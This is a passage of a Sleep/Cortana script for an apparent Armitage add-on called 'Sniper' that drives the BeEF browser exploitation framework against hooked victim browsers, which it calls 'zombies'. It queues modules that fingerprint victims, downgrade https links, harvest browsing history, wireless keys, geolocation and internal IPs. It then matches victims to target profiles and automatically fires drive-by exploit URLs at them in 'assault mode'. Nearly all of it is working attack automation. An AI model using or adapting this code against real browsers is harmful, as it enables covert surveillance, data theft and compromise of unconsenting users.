		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds", "Replay"), "sniper_hook", 1);
		refresh_list($beef_autorun);
		}
		
	# item "Web Drive-by Config" {
	#	local('$sniper');
	#	$sniper = open_table_tab("Web Drive-by", "", @("id", "Browser", "Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "Attack_URL"), @(), @("Add", "Refresh profiles","Edit", "Delete"), "sniper_hook", 1);
	#	refresh_profiles($sniper);
	#	}
	#item "Line of Sight(+) " {
	#		local('$attackMap');
	#		$attackMap = open_table_tab("Line of Sight", "", @("id", "ip", "sessionID", "Attack_URL"), @(), @("Refresh match", "Change URL", "Sniper shot"), "analyze_hook", 1);
	#		refresh_analyze($attackMap);
	#	}
	#menu "Assault mode" {
	#	item "Active" {   
	#			append($console, "\cC [*] Sniper is in assault mode");
	#			$assault = 1 ;
	#			}
	#	item "Stand-by" {  
	#			append($console, "\c4 [-]  Sniper is in stand-by. \n this mode is usefull only if you want to send attack_URL manualy so that you control each attempt");
	#			$assault = 0 ;
	#	        }
	#	}
	}
 }
popup analyze_hook {
		item "Sniper shot" {shot();}	
	} 

sub refresh_analyze {
	table_set($1, @analyze);
	}
	
sub refresh_list {
	table_set($1, @beef_autorun);
	}
	
sub refresh_details {
	table_set($1, @browser_profile_list);
	}
sub load_clientside_recon_mod {
			show_message("\c9 [+] Client-side Recon. modules loaded");
			if ( $recon == 0 ) { 
			%cmd0 = %(cc => "$id_beef_autorun", id => "$code_fingbrowser", name => "fingerprint browser", category => "client-side Recon", browser => "All", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd0; $id_beef_autorun = $id_beef_autorun + 1 ;
			
			%cmd1 = %(cc => "$id_beef_autorun", id => "$code_replacehttps", name => "replace https hrefs by http", category => "client-side Recon", browser => "All", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd1; $id_beef_autorun = $id_beef_autorun + 1 ;
			
			%cmd2 = %(cc => "$id_beef_autorun", id => "$code_visitedomain", name => "get visited domains", category => "client-side Recon", browser => "All", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd2; $id_beef_autorun = $id_beef_autorun + 1 ;
			
			%cmd3 = %(cc => "$id_beef_autorun", id => "$code_visitedurl", name => "get visited URLs", category => "client-side Recon", browser => "All", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd3; $id_beef_autorun = $id_beef_autorun + 1 ;
			
			%cmd4 = %(cc => "$id_beef_autorun", id => "$code_wireless", name => "get Wireless keys", category => "client-side Recon", browser => "All", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd4; $id_beef_autorun = $id_beef_autorun + 1 ;
			
			%cmd5 = %(cc => "$id_beef_autorun", id => "$code_geoloc", name => "get Geolocation", category => "client-side Recon", browser => "All", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd5; $id_beef_autorun = $id_beef_autorun + 1 ;
			
			%cmd6 = %(cc => "$id_beef_autorun", id => "$code_ipnat", name => "get internal IP (behind NAT)", category => "client-side Recon", browser => "All", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd6; $id_beef_autorun = $id_beef_autorun + 1 ;
			
			%cmd7 = %(cc => "$id_beef_autorun", id => "$code_sysinfo", name => "get system information", category => "client-side Recon", browser => "All", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd7; $id_beef_autorun = $id_beef_autorun + 1 ;
			
			%cmd8 = %(cc => "$id_beef_autorun", id => "$code_detectsoft", name => "detect installed software (IE only)", category => "client-side Recon", browser => "IE", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd8; $id_beef_autorun = $id_beef_autorun + 1 ;
						
			say("BeEF system profiling modules have been loaded. Check autorun command list");
			$recon = 1 ;
			}	
	}
	
#######  PROFILES DEFINITION #####
# These actions is very important for Sniper's functionnalities: 
# Here you define what exploits to use against any browser profile
sub refresh_profiles {
	table_set($1, @targets);
	}
sub edit_profiles {
	@i = flatten(table_selected($1, "id"));
	@brow = flatten(table_selected($1, "Browser"));
	@ver = flatten(table_selected($1, "Version"));
	@os = flatten(table_selected($1, "OS"));
	@plat = flatten(table_selected($1, "Platform"));
	@actv = flatten(table_selected($1, "ActiveX"));
	@fls = flatten(table_selected($1, "Flash"));
	@jv = flatten(table_selected($1, "Java"));
	@vbs = flatten(table_selected($1, "VBScript"));
	@plg = flatten(table_selected($1, "Plugins"));
	@urlb = flatten(table_selected($1, "Attack_URL"));
	
	$id_dr = @i[0];
	$brow_dr = @brow[0];
	$ver_dr = @ver[0];
	$os_dr = @os[0];
	$plat_dr = @plat[0]; 
	$actv_dr = @actv[0]; 
	$fls_dr = @fls[0]; 
	$jv_dr = @jv[0]; 
	$vbs_dr = @vbs[0]; 
	$plg_dr = @plg[0]; 
	$urlb_dr = @urlb[0]; 
	
	$browser_dr = prompt_text("Browser","$brow_dr");
	$version_dr = prompt_text("Version","$ver_dr");
	$os_dr = prompt_text("OS","$os_dr");
	$platform_dr = prompt_text("Plateform","$plat_dr");
	$activex_dr = prompt_text("Activex","$actv_dr");
	$flash_dr = prompt_text("Flash","$fls_dr");
	$java_dr = prompt_text("Java","$jv_dr");
	$vbs_dr = prompt_text("VBScript","$vbs_dr");
	$plugins_dr = prompt_text("Plugins ","$plg_dr");
	$url_dr = prompt_text("URL of the attack to map with this profile","$urlb_dr");
	%host_dr = %(id => $id_dr, Browser => "$browser_dr", Version => "$version_dr", OS => "$os_dr", Platform => "$platform_dr", ActiveX => "$activex_dr", Flash => "$flash_dr", Java => "$java_dr", VBScript => "$vbs_dr", Plugins => "$plugins_dr" , Attack_URL => "$url_dr");
	@targets[$id_dr] = %host_dr;
	refresh_profiles($1);
	}
sub add_profiles {
	$browser_dr = prompt_text("Browser","*");
	$version_dr = prompt_text("Version","*");
	$os_dr = prompt_text("OS","*");
	$platform_dr = prompt_text("Plateform","*");
	$activex_dr = prompt_text("Activex","*");
	$flash_dr = prompt_text("Flash","*");
	$java_dr = prompt_text("Java","*");
	$vbs_dr = prompt_text("VBScript","*");
	$plugins_dr = prompt_text("Plugins ","*");
	$url_dr = prompt_text("URL of the attack to map with this profile","http://");
	%host_dr = %(id => "$targets_id", Browser => "$browser_dr", Version => "$version_dr", OS => "$os_dr", Platform => "$platform_dr", ActiveX => "$activex_dr", Flash => "$flash_dr", Java => "$java_dr", VBScript => "$vbs_dr", Plugins => "$plugins_dr" , Attack_URL => "$url_dr");
	@targets[$targets_id] = %host_dr;
	$targets_id = $targets_id + 1 ;
	refresh_profiles($1);
	}
sub delete_profiles {
	@i = flatten(table_selected($1, "id"));
	$id_dr = @i[0];
	removeAt(@targets, $id_dr); 
	refresh_profiles($1);
	}
sub delete_entry {
	@i = flatten(table_selected($1, "cc"));
	$cc = @i[0];
	removeAt(@beef_autorun, $cc); 
	refresh_list($1);
	}
#----------------------------------------------------------------#
sub editparam {
	@cc = flatten(table_selected($1, "cc"));
	@editparm = flatten(table_selected($1, "Param"));
	$cc = @cc[0];
	$editparm = @editparm[0]; 
	$editparm = prompt_text("URL of the attack to map with this profile","$editparm");
	@beef_autorun[$cc]["Param"] = $editparm ;
	refresh_list($1);
}
# this action change URL that have been affected by sniper to a particular zombie.
sub changeurl {
	@i = flatten(table_selected($1, "id"));
	@urlb = flatten(table_selected($1, "Attack_URL"));
	$id_dr = @i[0];
	$urlb_dr = @urlb[0];
	$url_dr = prompt_text("URL of the attack to map with this profile","$urlb_dr");
	@analyze[$id_dr]["Attack_URL"] = $url_dr ;
	refresh_analyze($1);
	}

###- intelligence analysis -####
sub match_it {
#### STEP 1  -  extracted informations about a particular zombie.
	local('$match');
    if ($key ne "00000000000000000000000" ){  
	$BrowserName = @browser_profile_list[$1]["Browser"] ;
	$BrowserPlugins = @browser_profile_list[$1]["Plugins"] ;
	$BrowserReportedName = @browser_profile_list[$1]["ReportedName"] ;
	$BrowserType = @browser_profile_list[$1]["Type"] ;
	$BrowserVersion = @browser_profile_list[$1]["Version"] ;
	$HasActiveX = @browser_profile_list[$1]["ActiveX"] ;
	$HasFlash = @browser_profile_list[$1]["Flash"] ;
	$HasGoogleGears = @browser_profile_list[$1]["GoogleGears"] ;
	$HasWebSocket = @browser_profile_list[$1]["WebSocket"] ;
	$HostName = @browser_profile_list[$1]["HostName"] ;
	$JavaEnabled = @browser_profile_list[$1]["Java"] ;
	$OsName = @browser_profile_list[$1]["OS"] ;
	$SystemPlatform = @browser_profile_list[$1]["Platform"] ;
	$VBScriptEnabled = @browser_profile_list[$1]["VBScript"];
	$sip = @beef_hosts[$1]["ip"];
	$sid = @beef_hosts[$1]["sessionID"];
	println("valeur sessID en cours d'analyse"); println($sid);
	%extracted = %(id => "$1", sessionID => "$sid", Browser => "$BrowserName", ReportedName => "$BrowserReportedName", Type => "$BrowserType", Version => "$BrowserVersion", OS => "$OsName", Platform => "$SystemPlatform", ActiveX => "$HasActiveX", Flash => "$HasFlash", Java => "$JavaEnabled", VBScript => "$VBScriptEnabled", Plugins => "$BrowserPlugins", GoogleGears => "$HasGoogleGears", WebSocket => "$HasWebSocket", HostName => "$HostName" );
	
#### STEP 2  -  Try to find profiles matching with zombies's informations
		foreach $index => $value (@targets){
			%profile = $value;
			println("valeur browser extraite du profile pour test"); println(%profile["Browser"]);
			
			foreach $index2 => $value2 (%profile){  
				println("valeur extraite du profile en cours de Machage "); println($value2);
				#if ( $value2 eq "*" || "" || " "){
				#$match = 1; continue; println("valeur retenu pour match"); println($match);}
				#else {
				$match_regex = "(.*|\\s) $+ $value2 $+ (\\s|.*)" ; println("match regex en application"); println($match_regex);
				println("valeur du zombie en cours d'analyse"); println(%extracted["$index2"]);
				if ( %extracted["$index2"] ismatch $match_regex ){println("" . %extracted["$index2"] . "  > matchUP!!!" . $value2 . "");
				$match = 1;continue;}
				else{println("" . %extracted["$index2"] . "  > matchDOWN!!!" . $value2 . ""); $match = 0; break;}
				#}
			}
			if ($match == 1){
#### STEP 3  -  Zombies maps each with a client-side exploit well suited if we found one.				
			$inviframe = %profile["Attack_URL"];
			%analyz_dr = %(id => "$id_analyz", ip => "$sip", sessionID => "$sid" , Attack_URL => "$inviframe");
			@analyze["$id_analyz"] = %analyz_dr;
			$id_analyz = $id_analyz + 1 ;
			append($console , "Sniper has found a target that match with one of your defined profiles " )
				if ($assault_mode == 1){
				run_driveby($beefUrl, $sid, $key, $inviframe);
				append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " >>> " . $sid . "" );
				} 
				else { append($console , "\cC[*] Sniper wait for assault mode activation ... "); 
				}			
			}else{
			append($console , "\c4[-] Sniper has found no profile corresponding for zombie<$sid>" )
			}
		} fire_event("play_autorun_cmd", $1);
	}
	else
	{ println("\c4[!]No Key available") ;}
}

# This action tell sniper to shot now all targets which appear on the line of sigh.
# No, this is not a FPS game. 
sub snipershot_all {
	if (size(@analyze) != 0) {
	for ($i = 0; $i < size(@analyze); $i++)   {
			$sid = @analyze[$i]["sessionID"] ;
			$inviframe = @analyze[$i]["Attack_URL"] ;
			run_driveby($beefUrl, $sid, $key, $inviframe);
			append($console , "\c9[*] Sniper send attack " . $inviframe . " >>> " . $sid . "" );
			} 
		} else {println("No profiles-zombies association found !")}
}
# This action send attack_URL (drive-by) agains to a target selected by our Sniper.
sub snipershot {
	@sessid = flatten(table_selected($1, "sessionID"));
	@urlattack = flatten(table_selected($1, "Attack_URL"));
	$sessid_dr = @sessid[0];
	$inviframe = @urlattack[0];
	run_driveby($beefUrl, $sessid_dr, $key, $inviframe);
	append($console , "\c9[*] Sniper send attack " . $inviframe . " >>> " . $sessid_dr . "" );
}
# This action execute each commands added to the beef's autorun list once a new zombie appear	
@autorundisabled = @();
sub beef_autorun {
	local('$go');
	$lim = size(@beef_autorun);
	if ( $size_on != 0 && $lim != 0  ) {
		$browser = @beef_hosts[$1]["name"];
		$sesside = @beef_hosts[$1]["sessionID"];
	 	foreach $index => $sessvalue (@autorundisabled)  {
			if ( $sesside ne $sessvalue){ $go = 0; } else { $go = 1; break;} }
				if ( $go == 0) {
				for ($i = 0; $i < $lim; $i++)   {
				if ( $browser eq @beef_autorun[$i]["browser"]){
				$cmdeid = @beef_autorun[$i]["id"];
				$cmde_param = @beef_autorun[$i]["Param"];
				send_beefcmd_with_param($sesside, $cmdeid, $cmde_param,0);
				}
			} push(@autorundisabled, $sesside ) ; } else { println("autorun blocked");}
	append($console, "\cB (!) BeEF say \"Command not send\", don't pay attention.");	
	} else { println("Nothing");}	
}	
